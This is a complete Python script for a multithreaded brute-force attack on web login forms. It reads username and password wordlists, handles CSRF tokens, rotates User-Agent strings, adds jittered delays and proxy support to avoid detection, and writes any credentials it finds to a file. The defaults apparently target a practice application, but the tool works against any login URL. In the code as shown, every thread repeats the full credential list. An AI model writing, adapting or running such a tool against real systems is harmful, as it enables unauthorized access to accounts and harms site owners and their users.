#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import argparse
import urllib3
import re
import time
import threading
import random
from urllib.parse import parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import product, islice
import os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------- Color codes (unchanged) ----------
class Colors:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def green(text): return f"{Colors.GREEN}{text}{Colors.END}"
def blue(text): return f"{Colors.BLUE}{text}{Colors.END}"
def yellow(text): return f"{Colors.YELLOW}{text}{Colors.END}"
def red(text): return f"{Colors.RED}{text}{Colors.END}"
def purple(text): return f"{Colors.PURPLE}{text}{Colors.END}"
def cyan(text): return f"{Colors.CYAN}{text}{Colors.END}"
def bold(text): return f"{Colors.BOLD}{text}{Colors.END}"
def underline(text): return f"{Colors.UNDERLINE}{text}{Colors.END}"

# ---------- Global success storage (unchanged) ----------
class SuccessStorage:
    def __init__(self):
        self.credentials = []
        self.lock = threading.Lock()
    
    def add_credentials(self, username, password, location, status_code):
        with self.lock:
            self.credentials.append({
                'username': username,
                'password': password,
                'location': location,
                'status_code': status_code
            })
    
    def get_all_credentials(self):
        return self.credentials.copy()
    
    def has_credentials(self):
        return len(self.credentials) > 0

success_storage = SuccessStorage()

# ---------- Helpers (unchanged except minor cleanup) ----------
def extract_user_token_from_html(html, token_field='user_token'):
    if not html: return None
    soup = BeautifulSoup(html, 'html.parser')
    inp = soup.find('input', {'name': token_field})
    return inp.get('value') if inp else None

def print_success_banner(username, password, location, status_code, thread_id=None):
    thread_info = f"[Thread-{thread_id}] " if thread_id else ""
    print(green("=" * 60))
    print(green(bold(f"{thread_info}[+] CREDENTIALS FOUND!")))
    print(green("=" * 60))
    print(green(f"Username: {username}"))
    print(green(f"Password: {password}"))
    if location: print(green(f"Redirect: {location}"))
    if status_code: print(green(f"Status: {status_code}"))
    print(green("=" * 60))

def print_final_summary():
    credentials = success_storage.get_all_credentials()
    if not credentials:
        print(red("\n" + "=" * 60))
        print(red(bold("[!] NO CREDENTIALS FOUND")))
        print(red("=" * 60))
        return
    print(green("\n" + "=" * 60))
    print(green(bold("[+] BRUTE FORCE COMPLETED SUCCESSFULLY")))
    print(green("=" * 60))
    print(green(bold(f"Total credentials found: {len(credentials)}")))
    print(green("=" * 60))
    for i, cred in enumerate(credentials, 1):
        print(green(f"\n[{i}] Credential Set:"))
        print(green(f"   Username: {cred['username']}"))
        print(green(f"   Password: {cred['password']}"))
        if cred['location']: print(green(f"   Redirect: {cred['location']}"))
        if cred['status_code']: print(green(f"   Status: {cred['status_code']}"))
    print(green("\n" + "=" * 60))
    save_to_file(credentials)

def save_to_file(credentials):
    if not credentials: return
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"found_credentials_{timestamp}.txt"
    try:
        with open(filename, 'w') as f:
            f.write("=" * 60 + "\nFOUND CREDENTIALS\n" + "=" * 60 + "\n")
            f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total found: {len(credentials)}\n" + "=" * 60 + "\n\n")
            for i, cred in enumerate(credentials, 1):
                f.write(f"[{i}] {cred['username']}:{cred['password']}\n")
                if cred['location']: f.write(f"    Redirect: {cred['location']}\n")
                if cred['status_code']: f.write(f"    Status: {cred['status_code']}\n")
                f.write("\n")
        print(green(f"[*] Credentials saved to: {filename}"))
    except Exception as e:
        print(red(f"Failed to save: {e}"))

def print_attempt(thread_id, username, password, attempts, token_src=None):
    src = f" (token: {token_src})" if token_src else ""
    print(blue(f"[Thread-{thread_id}] Attempt #{attempts}: {username}:{password}{src}"))

def print_failed(thread_id, username, password, reason=""):
    reason_str = f" - {reason}" if reason else ""
    print(red(f"[Thread-{thread_id}] Failed: {username}:{password}{reason_str}"))

def print_info(text): print(cyan(f"[*] {text}"))
def print_warning(text): print(yellow(f"[!] {text}"))
def print_error(text): print(red(f"[!] {text}"))
def print_config(text): print(purple(f"[*] {text}"))

def check_error_response(response_text, error_substr_list, verbose=False):
    if not response_text or not error_substr_list: return False
    text_lower = response_text.lower()
    for err in error_substr_list:
        if err.lower() in text_lower:
            if verbose: print_warning(f"Error substring matched: {err}")
            return True
    return False

def check_failed_response(response_text, failed_regex_list, verbose=False):
    if not response_text or not failed_regex_list: return False
    for regex in failed_regex_list:
        try:
            if re.search(regex, response_text, re.IGNORECASE | re.DOTALL):
                if verbose: print_warning(f"Failed regex matched: {regex}")
                return True
        except re.error: continue
    return False

# ---------- User-Agent handling (unchanged) ----------
def load_user_agents(ua_file=None):
    builtin = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/129.0.0.0',
    ]
    if ua_file:
        try:
            with open(ua_file, 'r', encoding='utf-8', errors='ignore') as f:
                custom = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            if custom:
                print_info(f"Loaded {len(custom)} custom User-Agents")
                return custom
        except Exception as e:
            print_error(f"Failed to load UA file: {e}")
    print_info(f"Using {len(builtin)} built-in User-Agents")
    return builtin

# ---------- Worker class (minor changes) ----------
class BruteWorker:
    def __init__(self, config, worker_id):
        self.config = config
        self.worker_id = worker_id
        self.session = None
        self.attempts = 0
        self.last_request_time = 0
        self.found = False
        self.continue_after_success = config['continue_after_success']
        self.user_agents = config['user_agents']
    
    def get_session(self):
        if self.session is None:
            self.session = requests.Session()
            if self.config['proxy']:
                self.session.proxies = {'http': self.config['proxy'], 'https': self.config['proxy']}
            try:
                self.session.get(self.config['login_url'], verify=False, timeout=10)
            except:
                pass
        return self.session
    
    def respect_delay(self):
        if self.config['delay_time'] > 0:
            jitter = random.uniform(0, 0.3 * self.config['delay_time'])
            delay = self.config['delay_time'] + jitter
            time_since = time.time() - self.last_request_time
            if time_since < delay:
                time.sleep(delay - time_since)
            self.last_request_time = time.time()
    
    def get_random_ua(self):
        return random.choice(self.user_agents)
    
    def try_credentials(self, username, password):
        if self.found and not self.continue_after_success:
            return False
        
        session = self.get_session()
        self.respect_delay()
        
        token = None
        token_src = "unknown"
        
        if hasattr(session, "_last_response"):
            token = extract_user_token_from_html(session._last_response.text, self.config['token_field'])
            if token: token_src = "from_last_response"
        
        if not token:
            try:
                r = session.get(self.config['login_url'], headers={'User-Agent': self.get_random_ua()}, verify=False, timeout=10)
                token = extract_user_token_from_html(r.text, self.config['token_field'])
                if token: token_src = "from_fresh_get"
                session._last_response = r
            except:
                pass
        
        data = {
            self.config['user_field']: username,
            self.config['pass_field']: password,
            'Login': 'Login'
        }
        if token:
            data[self.config['token_field']] = token
        
        headers = {
            'User-Agent': self.get_random_ua(),
            'Referer': self.config['login_url'],
            'Origin': self.config['login_url'].rsplit('/', 1)[0],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'close',
        }
        if self.config['csrf_header_name'] and token:
            headers[self.config['csrf_header_name']] = token
        
        try:
            resp = session.post(self.config['login_url'], data=data, allow_redirects=False, 
                               headers=headers, verify=False, timeout=10)
            session._last_response = resp
            self.attempts += 1
            
            if self.config['verbose']:
                print_attempt(self.worker_id, username, password, self.attempts, token_src)
            
            loc = resp.headers.get('Location', '')
            text = resp.text
            
            if self.config['failed_regex_list'] and check_failed_response(text, self.config['failed_regex_list'], self.config['verbose']):
                return False
            if self.config['error_substr_list'] and check_error_response(text, self.config['error_substr_list'], self.config['verbose']):
                return False
            
            success = False
            if self.config['success_status_codes'] and resp.status_code in self.config['success_status_codes']:
                success = True
            elif self.config['success_location_substr'] and self.config['success_location_substr'] in loc:
                success = True
            elif not self.config['success_status_codes'] and not self.config['success_location_substr']:
                if 300 <= resp.status_code < 400:
                    success = True
            
            if success:
                success_storage.add_credentials(username, password, loc, resp.status_code)
                print_success_banner(username, password, loc, resp.status_code, self.worker_id)
                if not self.continue_after_success:
                    self.found = True
                return True
        except Exception as e:
            if self.config['verbose']:
                print_error(f"[Thread-{self.worker_id}] Error: {e}")
        return False

# ---------- Memory-efficient brute logic ----------
def generate_credential_pairs(wordlist_target, username, password, users_file, passwords_file):
    """Generator that yields (user, pass) pairs without loading everything into memory."""
    if wordlist_target == 'pass':
        if not username or not passwords_file:
            raise ValueError("Need --user and --passwords for pass mode")
        with open(passwords_file, 'r', encoding='utf-8', errors='ignore') as pf:
            for line in pf:
                pwd = line.strip()
                if pwd:
                    yield (username, pwd)
    
    elif wordlist_target == 'user':
        if not password or not users_file:
            raise ValueError("Need --password and --users for user mode")
        with open(users_file, 'r', encoding='utf-8', errors='ignore') as uf:
            for line in uf:
                usr = line.strip()
                if usr:
                    yield (usr, password)
    
    elif wordlist_target == 'both':
        if not users_file or not passwords_file:
            raise ValueError("Need --users and --passwords for both mode")
        # Use itertools.product to generate combinations lazily
        def user_gen():
            with open(users_file, 'r', encoding='utf-8', errors='ignore') as uf:
                for line in uf:
                    usr = line.strip()
                    if usr: yield usr
        
        def pass_gen():
            with open(passwords_file, 'r', encoding='utf-8', errors='ignore') as pf:
                for line in pf:
                    pwd = line.strip()
                    if pwd: yield pwd
        
        for combo in product(user_gen(), pass_gen()):
            yield combo

# Main brute function (now memory-efficient)
def brute_psycho_threaded(config):
    print_info(f"Starting brute force ({config['wordlist_target']} mode)")
    print_info(f"Threads: {config['threads']}, Base delay: {config['delay_time']}s (with jitter)")
    if config['proxy']: print_info(f"Proxy: {config['proxy']}")
    if config['continue_after_success']: print_info("Continue after success: YES")
    
    workers = [BruteWorker(config, i+1) for i in range(config['threads'])]
    
    def worker_task():
        for username, password in generate_credential_pairs(
            config['wordlist_target'], config['username'], config['password'],
            config['users_file'], config['passwords_file']
        ):
            if not config['continue_after_success'] and success_storage.has_credentials():
                break
            # Find a free worker (simple round-robin)
            worker = workers[threading.current_thread().ident % len(workers)]
            worker.try_credentials(username, password)
    
    with ThreadPoolExecutor(max_workers=config['threads']) as executor:
        futures = [executor.submit(worker_task) for _ in range(config['threads'])]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                if config['verbose']:
                    print_error(f"Thread error: {e}")
    
    total_attempts = sum(w.attempts for w in workers)
    print_info(f"Total attempts made: {total_attempts}")
    print_final_summary()
    
    return success_storage.has_credentials()

# ---------- CLI (updated to pass config dict) ----------
def main():
    parser = argparse.ArgumentParser(description="Psycho Tool Memory-efficient brute forcer - handles huge wordlists")
    parser.add_argument('--url', required=True)
    parser.add_argument('--user-field', default='username')
    parser.add_argument('--pass-field', default='password')
    parser.add_argument('--user', help='Single username (pass mode)')
    parser.add_argument('--password', help='Single password (user mode)')
    parser.add_argument('--users', help='Users file')
    parser.add_argument('--passwords', help='Passwords file')
    parser.add_argument('--wordlist-target', choices=['user','pass','both'], required=True)
    parser.add_argument('--token-field', default='user_token')
    parser.add_argument('--csrf-header', help='CSRF header name')
    parser.add_argument('--proxy')
    parser.add_argument('--user-agents', help='Custom UA file')
    parser.add_argument('--success-location', default='index.php')
    parser.add_argument('--success-status')
    parser.add_argument('--failed-regex-file')
    parser.add_argument('--failed-regex', action='append')
    parser.add_argument('--error-file')
    parser.add_argument('--error', action='append')
    parser.add_argument('--delay', type=float, default=0)
    parser.add_argument('--threads', type=int, default=1)
    parser.add_argument('--continue', dest='continue_after_success', action='store_true')
    parser.add_argument('--no-color', action='store_true')
    parser.add_argument('-v', '--verbose', action='store_true')
    args = parser.parse_args()

    if args.no_color:
        global Colors
        Colors = type('EmptyColors', (), {k: '' for k in Colors.__dict__ if not k.startswith('__')})

    success_status_codes = parse_status_codes(args.success_status)
    failed_regex_list = (parse_failed_regex(args.failed_regex_file) or []) + (args.failed_regex or [])
    error_substr_list = (parse_error_strings(args.error_file) or []) + (args.error or [])
    user_agents = load_user_agents(args.user_agents)

    config = {
        'login_url': args.url,
        'user_field': args.user_field,
        'pass_field': args.pass_field,
        'token_field': args.token_field,
        'csrf_header_name': args.csrf_header,
        'success_location_substr': args.success_location,
        'success_status_codes': success_status_codes,
        'failed_regex_list': failed_regex_list,
        'error_substr_list': error_substr_list,
        'delay_time': args.delay,
        'threads': args.threads,
        'proxy': args.proxy,
        'user_agents': user_agents,
        'continue_after_success': args.continue_after_success,
        'verbose': args.verbose,
        'wordlist_target': args.wordlist_target,
        'username': args.user,
        'password': args.password,
        'users_file': args.users,
        'passwords_file': args.passwords,
    }

    if args.verbose:
        print_config(bold("Configuration:"))
        print_config(f"URL: {args.url}")
        print_config(f"Mode: {args.wordlist_target}")
        print_config(f"Threads: {args.threads}")
        print_config(f"Delay: {args.delay}s (with jitter)")
        print_config(f"User-Agents: {len(user_agents)}")

    brute_psycho_threaded(config)

def parse_status_codes(s):
    if not s: return None
    codes = set()
    for part in s.split(','):
        part = part.strip()
        if '-' in part:
            try:
                start, end = map(int, part.split('-'))
                codes.update(range(start, end + 1))
            except:
                pass
        else:
            try:
                codes.add(int(part))
            except:
                pass
    return codes

def parse_failed_regex(file_path):
    if not file_path: return None
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except:
        return None

def parse_error_strings(file_path):
    if not file_path: return None
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except:
        return None

if __name__ == "__main__":
    main()